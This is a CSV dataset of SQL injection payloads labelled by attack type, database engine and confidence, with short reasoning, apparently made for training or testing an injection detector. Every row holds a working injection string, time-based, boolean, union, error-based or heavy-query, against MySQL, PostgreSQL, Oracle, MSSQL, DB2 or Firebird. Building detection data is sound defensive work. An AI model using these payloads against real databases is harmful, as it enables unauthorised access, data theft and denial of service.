id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
20944,1' ) and sleep ( 5 ) #,time_blind,mysql,0.9,"sleep() function detected for MySQL time-based blind SQLi. Pattern 'sleep ( 5 )' is definitive time-based attack vector.",2
20945,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( 'cbaj' = 'cbaj,time_blind,mysql,0.75,"sleep() in subquery indicates time-based blind SQLi against MySQL. Nested SELECT with sleep(5) delay vector.",1
20946,"-8040"" ) ) ) or make_set ( 3916 = 6787,6787 ) and ( ( ( ""laar"" like ""laar",boolean_blind,mysql,0.7,"make_set() function with boolean condition 'or make_set' for MySQL boolean-based blind SQLi.",0
20947,"-9932"" union all select 4049,4049,4049--",union_based,generic,0.8,"'union all select' pattern is classic union-based SQLi. Column count and structure match union injection.",2
20948,"1' ) ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,mysql,0.75,"elt() function with equality check AND sleep() present. Priority elt(P3) > sleep(P5), classified as boolean_blind.",2
20949,"1' and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.95,"dbms_pipe.receive_message() is Oracle-exclusive time-based blind function. Message receipt with delay = time_blind attack.",3
20950,"1 ) ) ) union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.8,"'union all select' with NULL padding for union-based SQLi. Multiple columns padding indicates result set alignment.",2
20951,"1' ) as kbja where 4275 = 4275 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",boolean_blind,mysql,0.7,"elt() in IF() condition for boolean exfiltration. Large numbers (8446744073709551610) suggest DoS/heavy_query but elt() priority is lower.",1
20952,1'+ ( select 'hjku' where 1954 = 1954 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) ) +',time_blind,mysql,0.75,"sleep() nested in subquery with boolean context. String concatenation ('+') typical MySQL time-based blind structure.",1
20953,"1 ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( 1624 = 1624",error_based,mysql,0.8,"extractvalue() for MySQL error-based SQLi. XPath injection in extractvalue() triggers database error.",1
20954,"1"" ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ""smhd"" like ""smhd",error_based,mysql,0.9,"extractvalue() function with XPath syntax. MySQL-specific error-based SQLi vector confirmed.",2
20955,"-1174"" union all select 4303,4303,4303,4303#",union_based,generic,0.8,"'union all select' with repeated column values for union-based SQLi injection.",2
20956,"1 ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,db2,0.7,"sysibm.systables indicates DB2 database. Cartesian join (t1,t2,t3) = heavy_query pattern but boolean condition is primary.",0
20957,"1' ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( 'zxhn' like 'zxhn",boolean_blind,mysql,0.7,"elt() with floor(rand()) = boolean exfiltration via GROUP BY. MySQL blind SQLi pattern.",1
20958,"1, ( select ( case when ( 1255 = 8025 ) then 1 else 1255* ( select 1255 from mysql.db ) end ) )",boolean_blind,mysql,0.7,"'case when' with mysql.db reference. MySQL-specific boolean condition for conditional SQLi.",1
20959,-1217' ) ) ) order by 1#,boolean_blind,generic,0.5,"order by 1 clause suggests column count enumeration. Minimal injection context but order by is common reconnaissance.",0
20960,"iif ( 2205 = 4764,1,1/0 )",benign,generic,0.5,"iif() function appears but lacks injection context. Standalone conditional without clear SQL context.",0
20961,"1"" union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.8,"'union all select' with NULL columns = union-based SQLi for result set alignment.",2
20962,"select * from generate_series ( 3267,3267,case when ( 3267 = 5900 ) then 1 else 0 end ) limit 1--",boolean_blind,postgresql,0.75,"generate_series() with 'case when' = PostgreSQL boolean-based blind SQLi. Dynamic range using conditional.",1
20963,"-5148"" ) ) or 5310 = 8229",boolean_blind,generic,0.5,"or 5310 = 8229 = boolean inequality without clear injection signal. Minimal evidence of attack.",1
20964,1 ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( 9505 = 9505,time_blind,postgresql,0.9,"pg_sleep() is PostgreSQL time-based blind SQLi marker. select from pg_sleep() = definitive time delay injection.",2
20965,1 ) ) ) and 9198 = 9198--,boolean_blind,generic,0.5,"and 9198 = 9198 = generic boolean always-true condition. Low confidence without DB/function markers.",1
20966,1%' ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.9,"pg_sleep() function = PostgreSQL time-based blind. select from pg_sleep() = attack marker.",2
20967,1'+ ( select 'zugq' where 9218 = 9218,boolean_blind,generic,0.5,"Generic boolean condition without SQLi function markers. Minimal attack evidence.",0
20968,"1%' and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and '%' = '",boolean_blind,mssql,0.75,"convert(int,...) and char() concatenation = MSSQL boolean-based blind with type casting attack.",1
20969,"-9848' union all select 1359,1359,1359,1359,1359,1359,1359,1359,1359,1359--",union_based,generic,0.8,"'union all select' with 10 repeated columns = union-based SQLi injection.",2
20970,"-1889%' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( '%' = '",out_of_band,oracle,0.8,"ctxsys.drithsx.sn() = Oracle out-of-band error-based SQLi. Context XPath function triggers external data exfiltration.",1
20971,"1' and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",heavy_query,generic,0.65,"repeat(left(...,500000000)) = CPU-intensive heavy query with regexp_substring. DoS-style payload.",0
20972,"1' or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and 'yhkr' = 'yhkr",boolean_blind,firebird,0.7,"rdb$ metadata tables (Firebird-specific) with cartesian join = boolean-based blind SQLi.",1
20973,"-4205' union all select 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986#",union_based,generic,0.8,"'union all select' with 10 padding columns = union-based SQLi.",2
20974,"1"" where 7158 = 7158",benign,generic,0.5,"where 7158 = 7158 = generic always-true condition without injection context.",1
20975,"1"" ) ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",heavy_query,generic,0.65,"char() concatenation with repeat(left(...,500000000)) = CPU-intensive DoS query. Heavy query pattern.",0
20976,1 where 3735 = 3735,benign,generic,0.5,"where 3735 = 3735 = static boolean condition without SQLi markers.",0
20977,"1 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) # lgoz",boolean_blind,mysql,0.7,"elt() in IF() for boolean exfiltration via GROUP BY aggregate. MySQL blind SQLi.",2
